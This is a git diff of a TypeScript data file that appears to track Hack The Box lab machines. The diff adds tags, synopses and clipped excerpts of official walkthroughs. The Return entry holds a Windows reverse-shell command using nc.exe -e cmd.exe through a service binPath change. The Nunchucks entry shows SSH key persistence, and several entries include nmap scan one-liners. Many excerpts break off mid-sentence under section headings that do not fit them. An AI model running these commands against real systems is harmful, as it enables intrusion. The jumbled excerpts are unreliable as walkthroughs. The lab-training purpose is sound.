+      "Forging-JWT-tokens",
+      "HQL-Injection",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/fingerprint",
     "writeupUrl": "https://0xdf.gitlab.io/tags#fingerprint",
-    "hint": "Hack The Box Linux machine. Rated Insane difficulty.",
+    "hint": "Fingerprint is an insane difficulty Linux machine which mainly focuses on web-based vulnerabilities such as HQL injection, Cross-Site Scripting and Java deserialization (with a custom gadget chain), with some additional focus on cryptography.",
     "timeSpentSeconds": 0,
     "createdAt": "2021-12-04T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Fingerprint is an insane difficulty Linux machine which mainly focuses on web-based vulnerabilities such as HQL injection, Cross-Site Scripting and Java deserialization (with a custom gadget chain), with some additional focus on cryptography.",
+    "skillsLearned": [
+      "HQL Injection",
+      "Building custom Java gadget chains for deserialization attacks",
+      "Forging JWT tokens",
+      "Attacking AES with ECB mode"
+    ],
+    "officialPdf": "417-Fingerprint_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nFingerprint is an insane difficulty Linux machine which mainly focuses on web-based vulnerabilities such as HQL injection, Cross-Site Scripting and Java deserialization (with a custom gadget chain), with some additional focus on cryptography.\n\n### 🎯 Core Skills\n- **HQL Injection**\n- **Building custom Java gadget chains for deserialization attacks**\n- **Forging JWT tokens**\n- **Attacking AES with ECB mode**\n\n### ⚔️ Foothold Vector\nrequires the concatenation of multiple steps, involving two separate web applications: HQL injection and XSS are exploited to bypass multi-factor authentication and gain access to a page where serialized Java data can be uploaded; path traversal is used to read Flask source code and obtain the application secret, which can be used to forge malicious JWT tokens and trigger deserialization of the uploaded data, leading to remote code execution. Lateral movement is possible due to a setuid binary that matches regular expressions on files, allowing to brute force the private SSH key of the user.\n\n### 👑 Privilege Escalation\n's private key file can be read, and ultimately resulting in an interactive shell with root privileges. Skills Required Enumeration Cross-Site Scripting Basic Java knowledge Basic Regular Expression knowledge Skills Learned HQL Injection Building custom Java gadget chains for deserialization attacks Forging JWT tokens Attacking AES with ECB mode Enumeration Nmap The nmap output shows OpenSSH listening on its default port 22 and two HTTP servers on ports 80 and 8080 respectively. Werkzeug Browsing to port 80 takes us to the landing page of a log manager called mylog . ports=$(nmap -p- --min-rate=1000 -T4 10.10.11."
   },
   {
     "id": "htb-backdoor",
@@ -6392,15 +6950,23 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
+      "Directory-traversal",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/backdoor",
     "writeupUrl": "https://0xdf.gitlab.io/tags#backdoor",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "Backdoor is an easy difficulty Linux machine which is hosting a Wordpress blog with an installed plugin that is vulnerable to a directory traversal exploit. This allows us to read the files in the /proc directory and identify the gdbserver running on one of the ports of the serve",
     "timeSpentSeconds": 0,
     "createdAt": "2021-11-20T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Backdoor is an easy difficulty Linux machine which is hosting a Wordpress blog with an installed plugin that is vulnerable to a directory traversal exploit. This allows us to read the files in the /proc directory and identify the gdbserver running on one of the ports of the server. An RCE exploit for gdbserver can be used to gain foothold. Further, on analyzing the processes running on the system, it is discovered that a screen session is running with root privileges. Attaching to this screen session leads to root access.",
+    "skillsLearned": [
+      "Directory traversal",
+      "Exploiting unprotected screen session"
+    ],
+    "officialPdf": "416-Backdoor_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nBackdoor is an easy difficulty Linux machine which is hosting a Wordpress blog with an installed plugin that is vulnerable to a directory traversal exploit. This allows us to read the files in the /proc directory and identify the gdbserver running on one of the ports of the server. An RCE exploit for gdbserver can be used to gain foothold. Further, on analyzing the processes running on the system, it is discovered that a screen session is running with root privileges. Attaching to this screen session leads to root access.\n\n### 🎯 Core Skills\n- **Directory traversal**\n- **Exploiting unprotected screen session**\n\n### ⚔️ Foothold Vector\n. Further, on analyzing the processes running on the system, it is discovered that a screen session is running with\n\n### 👑 Privilege Escalation\nprivileges. Attaching to this screen session leads to root access. Skills Required Web enumeration Exploiting Public Vulnerabilities Linux enumeration Skills learned Directory traversal Exploiting unprotected screen session Enumeration We will begin by scanning the host for any open ports and running services with a Nmap scan. Looking at the Nmap scan, we can see SSH running on port 22 and Apache web-server running on port 80, probably serving a Wordpress blog. Furthermore, port 1337 is also open, but Nmap couldn't identify the service running on it. This could be interesting (as hinted by the port number itself). Let's leave this port aside for now."
   },
   {
     "id": "htb-unicode",
@@ -6416,10 +6982,13 @@ export const INITIAL_MACHINES: Machine[] = [
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/unicode",
     "writeupUrl": "https://0xdf.gitlab.io/tags#unicode",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Unicode is a medium difficulty Linux machine. The machine begins with the",
     "timeSpentSeconds": 0,
     "createdAt": "2021-11-27T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Unicode is a medium difficulty Linux machine. The machine begins with the",
+    "officialPdf": "415-Unicode_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nUnicode is a medium difficulty Linux machine. The machine begins with the\n\n### ⚔️ Foothold Vector\nBrowsing to port 80, we are shown a landing page for Hackmedia with registration and login functionality. ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.126 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sV 10.10.11.126 Performing directory enumeration shows many 200s, which show 404 Not found when navigating to the website, so we apply a filter to show all results that are different than 1289 bytes long. This returns no results. The Google about us link redirects us to https://google.com and inspecting the link shows /redirect/? url=google.com but doesn't seem useful at this moment. ffuf -u http://10.10.11.\n\n### 👑 Privilege Escalation\nDifficulty: Medium Synopsis Unicode is a medium difficulty Linux machine. The machine begins with the enumeration of a webserver. Upon registering a new account on the webserver a JWT cookie is used to authenticate the current session. Inspecting the JWT cookie reveals that it is signed through a jwks.json file stored on the server. Further enumeration reveals a /redirect?url= endpoint. Combining the findings so far an attacker could use the jwt_tool to craft a cookie that authenticates the Administrator user. Replacing the authentication cookie with the newly crafted one, the attacker is able to access a new dashboard."
   },
   {
     "id": "htb-nunchucks",
@@ -6430,15 +6999,24 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "AppArmor-Profile-Bypass",
+      "HTB",
+      "NodeJS-Nunjucks-SSTI"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/nunchucks",
     "writeupUrl": "https://0xdf.gitlab.io/tags#nunchucks",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "Nunchucks is a easy machine that explores a NodeJS-based Server Side Template Injection (SSTI) leading to an AppArmor bug which disregards the binary's AppArmor profile while executing scripts that include the shebang of the profiled application.",
     "timeSpentSeconds": 0,
     "createdAt": "2021-11-02T10:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Nunchucks is a easy machine that explores a NodeJS-based Server Side Template Injection (SSTI) leading to an AppArmor bug which disregards the binary's AppArmor profile while executing scripts that include the shebang of the profiled application.",
+    "skillsLearned": [
+      "NodeJS Nunjucks SSTI",
+      "AppArmor Profile Bypass"
+    ],
+    "officialPdf": "414-Nunchucks_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nNunchucks is a easy machine that explores a NodeJS-based Server Side Template Injection (SSTI) leading to an AppArmor bug which disregards the binary's AppArmor profile while executing scripts that include the shebang of the profiled application.\n\n### 🎯 Core Skills\n- **NodeJS Nunjucks SSTI**\n- **AppArmor Profile Bypass**\n\n### 👑 Privilege Escalation\nTo get a reliable shell we gain a stable shell and generate a SSH private key. Copying the key to our localhost and trying to SSH into the target as david we notice that our key doesn't work. So we echo our own id_rsa.pub into authorized keys and attempt to gain SSH access again. Enumerating the filesystem we see that Perl has setuid capabilities set. echo <id_rsa.pub> > ~/.ssh/authorized_keys ssh david@nunchucks.htb getcap -r / Visiting GTFObins and looking at the Perl section we see that they do have a capabilities section with a proof of concept code. Trying to execute the standard /bin/sh payload seems to do nothing."
   },
   {
     "id": "htb-spooktrol",
@@ -6468,15 +7046,23 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "CVE-2021-27928",
+      "HTB",
+      "IPMI"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/shibboleth",
     "writeupUrl": "https://0xdf.gitlab.io/tags#shibboleth",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Shibboleth is a medium difficulty Linux machine featuring IPMI and Zabbix software. IPMI authentication is found to be vulnerable to remote password hash retrieval.",
     "timeSpentSeconds": 0,
     "createdAt": "2021-11-13T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Shibboleth is a medium difficulty Linux machine featuring IPMI and Zabbix software. IPMI authentication is found to be vulnerable to remote password hash retrieval. The hash can be cracked and Zabbix access can be obtained using these credentials. Foothold can be gained by abusing the Zabbix agent in order to run system commands. The initial password can be re-used to login as the ipmi-svc and acquire the user flag. A MySQL service is identified and found to be vulnerable to OS command execution. After successfully exploiting this service a root shell is gained.",
+    "skillsLearned": [
+      "IPMI"
+    ],
+    "officialPdf": "410-Shibboleth_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nShibboleth is a medium difficulty Linux machine featuring IPMI and Zabbix software. IPMI authentication is found to be vulnerable to remote password hash retrieval. The hash can be cracked and Zabbix access can be obtained using these credentials. Foothold can be gained by abusing the Zabbix agent in order to run system commands. The initial password can be re-used to login as the ipmi-svc and acquire the user flag. A MySQL service is identified and found to be vulnerable to OS command execution. After successfully exploiting this service a root shell is gained.\n\n### 🎯 Core Skills\n- **IPMI**\n\n### 🛡️ Associated CVEs\n`CVE-2021-27928`\n\n### ⚔️ Foothold Vector\ncan be gained by abusing the Zabbix agent in order to run system commands. The initial password can be re-used to login as the ipmi-svc and acquire the user flag. A MySQL service is identified and found to be vulnerable to OS command execution. After successfully exploiting this service a\n\n### 👑 Privilege Escalation\nshell is gained. Skills Required Basic Network Knowledge OWASP Top 10 Basic Linux Knowledge Skills Learned IPMI Enumeration & Exploitation Zabbix Exploitation MySQL Exploitation Enumeration Nmap Let's start with a port scan. Nmap reveals that there is only one port, HTTP (80), open. It is also clear that the server redirects us to shibboleth.htb . Let's add this to our hosts file and browse to this virtual host. The application is static other than the contact page. Let's browse to it. ports=$(nmap -p- --min-rate=1000 -T4 10.129.118.50 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sV -sC 10.129.118.50 echo '10.129.118.50 shibboleth."
   },
   {
     "id": "htb-toby",
@@ -6487,15 +7073,24 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Insane",
     "status": "backlog",
     "tags": [
+      "Cryptography",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/toby",
     "writeupUrl": "https://0xdf.gitlab.io/tags#toby",
-    "hint": "Hack The Box Linux machine. Rated Insane difficulty.",
+    "hint": "Toby, is a linux box categorized as Insane. The initial foothold on this box is about",
     "timeSpentSeconds": 0,
     "createdAt": "2021-11-06T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Toby, is a linux box categorized as Insane. The initial foothold on this box is about",
+    "skillsLearned": [
+      "Interacting with malware backdoors",
+      "Cryptography",
+      "PAM module authentication"
+    ],
+    "officialPdf": "409-Toby_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nToby, is a linux box categorized as Insane. The initial foothold on this box is about\n\n### 🎯 Core Skills\n- **Interacting with malware backdoors**\n- **Cryptography**\n- **PAM module authentication**\n\n### ⚔️ Foothold Vector\non this box is about enumeration and exploiting a leftover backdoor in a Wordpress blog that was previously compormised. Eventually, a shell can be retrivied to a docker container. Enumerating the Docker environment, we can identify more Docker containers on the same internal network. Having access to the internal network a pivot can be made on an exposed MySQL server to extract some password hashes. Upon cracking the password hashes and testing for password re-use on previously exposed services the source code for a web application running on the internal Docker network can be found. The source code exposes a way to make the MySQL server connect back to a local machine.\n\n### 👑 Privilege Escalation\n. Skills Required Enumeration Docker enumeration Offline password cracking Reverse Engineering Skills Learned Interacting with malware backdoors Cryptography PAM module authentication Enumeration Nmap Looking at the Nmap output we can see SSH listening on port 22 and Nginx listening on port 80. Also, Nmap reveals that the web page served on port 80 is probably a Wordpress blog. Nginx Without any valid SSH credentials our first step is to visit http://10.10.11.121 . But, upon visiting the website everything seems broken. Taking a closer look at the source code we can see the reason behind this: The problem is that the web page tries to load assets from wordpress.toby.htb ."
   },
   {
     "id": "htb-secret",
@@ -6506,15 +7101,24 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "JWT-forgery",
+      "SUID"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/secret",
     "writeupUrl": "https://0xdf.gitlab.io/tags#secret",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "Secret is an easy Linux machine that features a website that provides the source code for a custom authentication API.",
     "timeSpentSeconds": 0,
     "createdAt": "2021-10-30T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Secret is an easy Linux machine that features a website that provides the source code for a custom authentication API.",
+    "skillsLearned": [
+      "JWT forgery",
+      "SUID"
+    ],
+    "officialPdf": "408-Secret_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nSecret is an easy Linux machine that features a website that provides the source code for a custom authentication API.\n\n### 🎯 Core Skills\n- **JWT forgery**\n- **SUID**\n\n### ⚔️ Foothold Vector\nCore dump analysis Enumeration Nmap Nmap output reveals three ports open. On port 22 we have SSH, on port 80 an Ngninx web server is running and on port 3000 Node.js is listening. Nginx - Port 80 ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.120 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sC -sV 10.10.11.120 Upon visiting port 80, we are presented with a page that mentions an API based authentication system. Clicking on the Live Demo option on the top right of the page leads to /api but we get a 404 error. Another interesting option is found a the bottom of the index page. There, we have the ability to download the source code of the API.\n\n### 👑 Privilege Escalation\nand reads any file on the remote system. Furthermore, core dumps are enabled meaning that if a crash occurs during the operation of the binary and a sensitive file is loaded, the core dump will have the file's contents. Exploiting this path we can get the contents of root's SSH key and get a shell as root on the remote machine. Skills Required Enumeration Source code review Command injection Skills Learned JWT forgery SUID exploitation Core dump analysis Enumeration Nmap Nmap output reveals three ports open. On port 22 we have SSH, on port 80 an Ngninx web server is running and on port 3000 Node.js is listening. Nginx - Port 80 ports=$(nmap -p- --min-rate=1000 -T4 10.10.11."
   },
   {
     "id": "htb-return",
@@ -6525,15 +7129,23 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "Network-Printer-Abuse"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/return",
     "writeupUrl": "https://0xdf.gitlab.io/tags#return",
-    "hint": "Hack The Box Windows machine. Rated Easy difficulty.",
+    "hint": "Return is an easy difficulty Windows machine featuring a network printer administration panel that stores LDAP credentials. These credentials can be captured by inputting a malicious LDAP server which allows obtaining foothold on the server through the WinRM service.",
     "timeSpentSeconds": 0,
     "createdAt": "2021-09-27T09:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Return is an easy difficulty Windows machine featuring a network printer administration panel that stores LDAP credentials. These credentials can be captured by inputting a malicious LDAP server which allows obtaining foothold on the server through the WinRM service. User found to be part of a privilege group which further exploited to gain system access.",
+    "skillsLearned": [
+      "Network Printer Abuse",
+      "Server Operators Group Abuse"
+    ],
+    "officialPdf": "401-Return_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nReturn is an easy difficulty Windows machine featuring a network printer administration panel that stores LDAP credentials. These credentials can be captured by inputting a malicious LDAP server which allows obtaining foothold on the server through the WinRM service. User found to be part of a privilege group which further exploited to gain system access.\n\n### 🎯 Core Skills\n- **Network Printer Abuse**\n- **Server Operators Group Abuse**\n\n### ⚔️ Foothold Vector\non the server through the WinRM service. User found to be part of a privilege group which further exploited to gain system access. Skills Required Basic Windows Knowledge Beginner Active Directory Knowledge Skills Learned Network Printer Abuse Server Operators Group Abuse Enumeration Nmap Let's start with port scan. Nmap output shows that the target is a Windows machine with ports 80 (Internet Information Services), 445 (SMB) and 5985 (Windows Remote Management) available. SMB Let's enumerate SMB service using enum4linux tool. This reveals that the host is part of the RETURN domain. SMB does not allow NULL or guest sessions, so can turn our attention to the website.\n\n### 👑 Privilege Escalation\nEnumerating group memberships reveals that svc-printer is part of Server Operators group. We can read more about this group here. Members of this group can start/stop system services. Let's modify a service binary path to obtain reverse shell. Stand up a listener on port 1234 and issue below commands to obtain reverse shell. upload /usr/share/windows-resources/binaries/nc.exe sc.exe config vss binPath=\"C:\\Users\\svc-printer\\Documents\\nc.exe -e cmd.exe 10.10.14.2 1234\" sc.exe stop vss sc.exe start vss"
   },
   {
     "id": "htb-antique",
@@ -6544,15 +7156,22 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "SNMP"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/antique",
     "writeupUrl": "https://0xdf.gitlab.io/tags#antique",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "Antique is an easy Linux machine featuring a network printer disclosing credentials through SNMP string which allows logging into telnet service. Foothold can be obtained by exploiting a feature in printer.",
     "timeSpentSeconds": 0,
     "createdAt": "2021-09-27T09:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Antique is an easy Linux machine featuring a network printer disclosing credentials through SNMP string which allows logging into telnet service. Foothold can be obtained by exploiting a feature in printer. CUPS administration service running locally. This service can be exploited further to gain root access on the server.",
+    "skillsLearned": [
+      "SNMP"
+    ],
+    "officialPdf": "400-Antique_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nAntique is an easy Linux machine featuring a network printer disclosing credentials through SNMP string which allows logging into telnet service. Foothold can be obtained by exploiting a feature in printer. CUPS administration service running locally. This service can be exploited further to gain root access on the server.\n\n### 🎯 Core Skills\n- **SNMP**\n\n### ⚔️ Foothold Vector\ncan be obtained by exploiting a feature in printer. CUPS administration service running locally. This service can be exploited further to gain\n\n### 👑 Privilege Escalation\naccess on the server. Skills Required Basic Linux Knowledge Basic Printers Knowledge Skills Learned SNMP Enumeration Network Printer Abuse Local Pivoting/Proxy Setup CUPS Administration exploitation Enumeration Nmap Let's start with port scan. Nmap scan reveals that the target server has telnet service running. Let's scan UDP ports. We see SNMP port is open and nmap reports that it supports community string public . SNMP Let's enumerate SNMP service using snmpwalk tool. ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.251 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sV -sC 10.10.10.251 ports=$(sudo nmap -p- --min-rate=1000 -T4 10.10.10."
   },
   {
     "id": "htb-overflow",
@@ -6563,15 +7182,30 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
+      "2021",
+      "22204",
+      "Buffer-Overflow",
+      "CVE-2021-22204",
+      "Exploiting-CVE",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/overflow",
     "writeupUrl": "https://0xdf.gitlab.io/tags#overflow",
-    "hint": "Hack The Box Linux machine. Rated Hard difficulty.",
+    "hint": "Overflow is a hard difficulty Linux machine that showcases different vulnerabilities and exploitation techniques such as Padding Oracle attacks, SQL Injection, Remote Code Execution in ExifTool (CVE-2021- 22204) and binary exploitation. Foothold is obtained by running a Padding O",
     "timeSpentSeconds": 0,
     "createdAt": "2021-10-23T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Overflow is a hard difficulty Linux machine that showcases different vulnerabilities and exploitation techniques such as Padding Oracle attacks, SQL Injection, Remote Code Execution in ExifTool (CVE-2021- 22204) and binary exploitation. Foothold is obtained by running a Padding Oracle attack on a session cookie, obtaining administrator access to a web application.",
+    "skillsLearned": [
+      "Performing Padding Oracle attacks",
+      "Exploiting CVE",
+      "2021",
+      "22204",
+      "Buffer Overflow"
+    ],
+    "officialPdf": "399-Overflow_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nOverflow is a hard difficulty Linux machine that showcases different vulnerabilities and exploitation techniques such as Padding Oracle attacks, SQL Injection, Remote Code Execution in ExifTool (CVE-2021- 22204) and binary exploitation. Foothold is obtained by running a Padding Oracle attack on a session cookie, obtaining administrator access to a web application.\n\n### 🎯 Core Skills\n- **Performing Padding Oracle attacks**\n- **Exploiting CVE**\n- **2021**\n- **22204**\n- **Buffer Overflow**\n\n### 🛡️ Associated CVEs\n`CVE-2021-22204`\n\n### ⚔️ Foothold Vector\ntechniques such as Padding Oracle attacks, SQL Injection, Remote Code Execution in ExifTool (CVE-2021- 22204) and binary exploitation. Foothold is obtained by running a Padding Oracle attack on a session cookie, obtaining administrator access to a web application. Next, an SQL Injection vulnerability is exploited to retrieve credentials that allow access to a second web application, which in turn contains information for accessing a third application, where image files can be uploaded resulting in Remote Command Execution through ExifTool. Lateral movement to a second user is possible due to password reuse.\n\n### 👑 Privilege Escalation\n. Skills Required Enumeration Basic SQL Injection techniques Basic Reversing and Binary Exploitation knowledge Skills Learned Performing Padding Oracle attacks Exploiting CVE-2021-22204 Buffer Overflow exploitation Enumeration Nmap The nmap output shows that OpenSSH, Postfix and Apache are listening on their default ports. Apache Browsing to port 80 takes us to the website of Overflow Security. ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.119 | grep ^[0-9] | cut -d '/' -f1 | tr '\\n' ',' | sed s/,$//) nmap -sC -sV -p$ports 10.10.11.119 Clicking the Sign Up link we can register a new user. After hitting the submit button we are automatically logged in."
   },
   {
     "id": "htb-devzat",
@@ -6582,15 +7216,26 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "CVE-2019-20933",
+      "Command-Injection",
+      "HTB",
+      "Source-code-review"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/devzat",
     "writeupUrl": "https://0xdf.gitlab.io/tags#devzat",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Devzat is a medium Linux machine that features a web server and the Devzat chat application. Upon enumerating the web server, a new vhost called pets can be discovered.",
     "timeSpentSeconds": 0,
     "createdAt": "2021-10-16T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Devzat is a medium Linux machine that features a web server and the Devzat chat application. Upon enumerating the web server, a new vhost called pets can be discovered. The pets vhost has a .git directory with listing enabled, providing access to the source code of pets . Reviewing the source code, a command injection vulnerability is discovered allowing an attacker to gain a reverse shell as the user patrick . Logging to the Devzat chat application as patrick on the remote machine the chat history between patrick and admin reveals that InfluxDB is installed on the remote system.",
+    "skillsLearned": [
+      "Source code review",
+      "Command Injection",
+      "Local File Inclusion attack"
+    ],
+    "officialPdf": "398-Devzat_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nDevzat is a medium Linux machine that features a web server and the Devzat chat application. Upon enumerating the web server, a new vhost called pets can be discovered. The pets vhost has a .git directory with listing enabled, providing access to the source code of pets . Reviewing the source code, a command injection vulnerability is discovered allowing an attacker to gain a reverse shell as the user patrick . Logging to the Devzat chat application as patrick on the remote machine the chat history between patrick and admin reveals that InfluxDB is installed on the remote system.\n\n### 🎯 Core Skills\n- **Source code review**\n- **Command Injection**\n- **Local File Inclusion attack**\n\n### 🛡️ Associated CVEs\n`CVE-2019-20933`\n\n### ⚔️ Foothold Vector\nLooking at main.go we find the source code for the pets vhost. Reviewing the source code carefully we can craft an exploit chain that will get us a reverse shell. First of all, the function handleRequest() reveals the /api/pet endpoint. This endpoint calls the petHandler() function. According to this function if we make a POST request to this endpoint we can add a pet. The source code also reveals the structure of a Pet object. func handleRequest() { <SNIP> // API routes apiHandler := http.HandlerFunc(petHandler) http.Handle(\"/api/pet\", headerMiddleware(apiHandler)) log.Fatal(http.ListenAndServe(\"127.0.0.1:5000\", nil)) } func petHandler(w http.ResponseWriter, r *http.\n\n### 👑 Privilege Escalation\nand ultimately gain a shell as root on the remote machine using the SSH key. Skills Required Enumeration Known vulnerabilities research Skills Learned Source code review Command Injection Local File Inclusion attack Enumeration Nmap Nmap output reveals three ports open. On port 22 SSH is enabled, on port 80 an Apache HTTP server is running and port 8000 seems to host another SSH service. Nmap also reveals that upon visiting port 80 we are redirected to http://devzat.htb . So we modify our hosts file accordingly. Apache Let's browse to http://devzat.htb . ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.118 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sC -sV 10.10."
   },
   {
     "id": "htb-jarmis",
@@ -6620,15 +7265,25 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "CVE-2018-16341",
+      "HTB",
+      "Socket-reuse-in-binary"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/hancliffe",
     "writeupUrl": "https://0xdf.gitlab.io/tags#hancliffe",
-    "hint": "Hack The Box Windows machine. Rated Hard difficulty.",
+    "hint": "Hancliffe is a hard difficulty Windows machine, which mainly focuses on web attacks and binary exploitation. Foothold is obtained by exploiting a Server Side Template Injection vulnerability ( CVE-2018- 16341 ) after gaining access to an internal application due to an inconsisten",
     "timeSpentSeconds": 0,
     "createdAt": "2021-10-09T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Hancliffe is a hard difficulty Windows machine, which mainly focuses on web attacks and binary exploitation. Foothold is obtained by exploiting a Server Side Template Injection vulnerability ( CVE-2018- 16341 ) after gaining access to an internal application due to an inconsistency in URI normalization between Nginx and Java, which leads to a reverse proxy bypass.",
+    "skillsLearned": [
+      "Techniques for bypassing Nginx rules",
+      "Decrypting Mozilla passwords",
+      "Socket reuse in binary"
+    ],
+    "officialPdf": "388-Hancliffe_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nHancliffe is a hard difficulty Windows machine, which mainly focuses on web attacks and binary exploitation. Foothold is obtained by exploiting a Server Side Template Injection vulnerability ( CVE-2018- 16341 ) after gaining access to an internal application due to an inconsistency in URI normalization between Nginx and Java, which leads to a reverse proxy bypass.\n\n### 🎯 Core Skills\n- **Techniques for bypassing Nginx rules**\n- **Decrypting Mozilla passwords**\n- **Socket reuse in binary**\n\n### 🛡️ Associated CVEs\n`CVE-2018-16341`\n\n### ⚔️ Foothold Vector\n. Foothold is obtained by exploiting a Server Side Template Injection vulnerability ( CVE-2018- 16341 ) after gaining access to an internal application due to an inconsistency in URI normalization between Nginx and Java, which leads to a reverse proxy bypass. A remote code execution vulnerability in Unified Remote 3 is then exploited to move laterally and discover Firefox stored credentials, which allow access to a password manager application where credentials of a development user can be retrieved. Finally, a buffer overflow vulnerability in a custom application running with Administrator privileges is exploited to gain a high privileged shell on the target system.\n\n### 👑 Privilege Escalation\nThe C:\\DevApp directory contains an executable file called MyFirstApp.exe and a PowerShell script called restart.ps1 . The restart.ps1 script runs MyFirstApp.exe and forwards its local listening port to 9999, then waits three minutes before killing the task and running it again in an infinite loop. # Restart app every 3 mins to avoid crashes while($true) { # Delete existing forwards cmd /c \"netsh interface portproxy delete v4tov4 listenport=9999 listenaddress=0.0.0.0\" # Spawn app $proc = Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList (\"C:\\DevApp\\MyFirstApp."
   },
   {
     "id": "htb-driver",
@@ -6639,15 +7294,24 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "Hash-capturing",
